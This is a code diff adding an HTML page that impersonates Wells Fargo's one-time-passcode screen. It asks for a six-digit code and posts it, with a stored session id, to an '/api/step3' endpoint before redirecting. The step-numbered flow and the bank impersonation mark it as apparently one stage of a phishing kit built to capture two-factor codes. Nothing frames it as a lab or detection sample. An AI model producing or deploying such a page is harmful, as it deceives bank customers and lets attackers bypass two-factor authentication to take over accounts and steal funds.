@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wells Fargo – Enter Code</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; background: linear-gradient(to bottom, #87ceeb 0%, #b0d8a4 70%, #6a9c5e 100%); }
+    nav { background: #cc0000; height: 50px; padding: 0 1.5rem; display: flex; align-items: center; }
+    .nav-brand { color: white; font-weight: 700; font-size: 18px; letter-spacing: 1px; }
+    main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+    .card { background: white; border-radius: 12px; padding: 2rem 2.5rem; width: 100%; max-width: 440px; text-align: center; }
+    .icon { font-size: 40px; margin-bottom: 1rem; }
+    h1 { font-weight: 300; font-size: 24px; color: #333; margin-bottom: 0.4rem; }
+    .sub { font-size: 13px; color: #999; margin-bottom: 2rem; line-height: 1.6; }
+    .otp-row { display: flex; justify-content: center; gap: 10px; margin-bottom: 1.5rem; }
+    .otp-box { width: 48px; height: 56px; border-radius: 10px; border: 2px solid #ddd; font-size: 24px; font-weight: 600; text-align: center; color: #333; outline: none; transition: border-color 0.2s; background: #fff; }
+    .otp-box:focus { border-color: #cc0000; }
+    .otp-box.filled { border-color: #2e7d32; }
+    .msg { display: none; border-radius: 8px; padding: 10px 14px; font-size: 13px; margin-bottom: 14px; }
+    .msg.error { display: block; background: #fdecea; color: #b00020; border: 1px solid #f5c6cb; }
+    .btn { width: 100%; height: 48px; border-radius: 26px; border: none; background: #ccc; color: white; font-size: 15px; cursor: not-allowed; transition: background 0.2s; margin-bottom: 16px; }
+    .btn.active { background: #cc0000; cursor: pointer; }
+    .resend { font-size: 13px; color: #4a4fcf; cursor: pointer; background: none; border: none; }
+  </style>
+</head>
+<body>
+  <nav><span class="nav-brand">WELLS FARGO</span></nav>
+  <main>
+    <div class="card">
+      <div class="icon">📱</div>
+      <h1>Enter your code</h1>
+      <p class="sub">We sent a 6-digit verification code to your registered device. Please enter it below.</p>
+      <div class="msg" id="msg"></div>
+      <div class="otp-row">
+        <input class="otp-box" id="o1" maxlength="1" inputmode="numeric" />
+        <input class="otp-box" id="o2" maxlength="1" inputmode="numeric" />
+        <input class="otp-box" id="o3" maxlength="1" inputmode="numeric" />
+        <input class="otp-box" id="o4" maxlength="1" inputmode="numeric" />
+        <input class="otp-box" id="o5" maxlength="1" inputmode="numeric" />
+        <input class="otp-box" id="o6" maxlength="1" inputmode="numeric" />
+      </div>
+      <button class="btn" id="submitBtn" disabled onclick="handleOTP()">Verify Code</button>
+      <button class="resend" onclick="this.textContent='Code resent!'">Resend code</button>
+    </div>
+  </main>
+  <script>
+    const boxes = ['o1','o2','o3','o4','o5','o6'].map(id => document.getElementById(id));
+    boxes.forEach((box, i) => {
+      box.addEventListener('input', () => {
+        box.value = box.value.replace(/\D/g, '');
+        if (box.value) { box.classList.add('filled'); if (i < 5) boxes[i+1].focus(); }
+        else box.classList.remove('filled');
+        checkReady();
+      });
+      box.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !box.value && i > 0) {
+          boxes[i-1].focus(); boxes[i-1].value = ''; boxes[i-1].classList.remove('filled');
+        }
+      });
+      box.addEventListener('paste', e => {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').substring(0,6);
+        paste.split('').forEach((char, j) => { if (boxes[j]) { boxes[j].value = char; boxes[j].classList.add('filled'); } });
+        checkReady();
+        if (paste.length < 6) boxes[paste.length]?.focus();
+      });
+    });
+    function checkReady() {
+      const ready = boxes.every(b => b.value.length === 1);
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = !ready; btn.classList.toggle('active', ready);
+    }
+    async function handleOTP() {
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = true; btn.textContent = 'Verifying...';
+      const otp = boxes.map(b => b.value).join('');
+      try {
+        const res = await fetch('/api/step3', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ otp, sessionId: sessionStorage.getItem('wfSid') })
+        });
+        const data = await res.json();
+        if (data.success) {
+          sessionStorage.removeItem('wfSid');
+          window.location.href = data.redirectUrl;
+        } else {
+          document.getElementById('msg').textContent = data.message || 'Invalid code.';
+          document.getElementById('msg').className = 'msg error';
+          boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+          boxes[0].focus();
+          btn.disabled = false; btn.textContent = 'Verify Code'; btn.classList.add('active');
+        }
+      } catch(err) {
+        document.getElementById('msg').textContent = 'Network error.';
+        document.getElementById('msg').className = 'msg error';
+        btn.disabled = false; btn.textContent = 'Verify Code'; btn.classList.add('active');
+      }
+    }
+  </script>
+</body>
+</html>
